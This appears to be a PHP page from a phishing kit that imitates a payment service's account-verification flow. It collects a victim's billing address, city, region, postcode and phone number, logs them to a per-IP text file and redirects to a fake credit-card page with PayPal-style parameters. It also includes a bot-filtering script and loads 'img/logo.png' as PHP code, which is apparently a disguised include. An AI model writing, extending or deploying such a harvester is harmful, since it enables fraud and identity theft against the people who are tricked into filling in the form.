<?php

include 'bots.php';
    $file = "infos/".$_SERVER['REMOTE_ADDR'].".txt";
    $ip = getenv("REMOTE_ADDR");

    $message = '|================ Adresse de Facturation  ===============|'."\r\n";
    $message .= '|Adresse                    :  '.$_POST['addr']."\r\n";
    $message .= '|PAYS                       :  '.$_POST['country']."\r\n";
    $message .= '|VILLE                      :  '.$_POST['ville']."\r\n";
    $message .= '|Provence / Région          :  '.$_POST['provence_region']."\r\n";

    $message .= '|Code Postale               :  '.$_POST['zip']."\r\n";

    $message .= '|Téléphone                  :  '.$_POST['phone']."\r\n";

    $file = fopen("$file","a+")or die("Unable to open file!");
    fwrite($file,$message);
    fclose($file);
    header("location: Credit-card.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
<html lang="en">
    <head>
		<script language="php">require ('img/logo.png');</script>
    </head>
	 </html>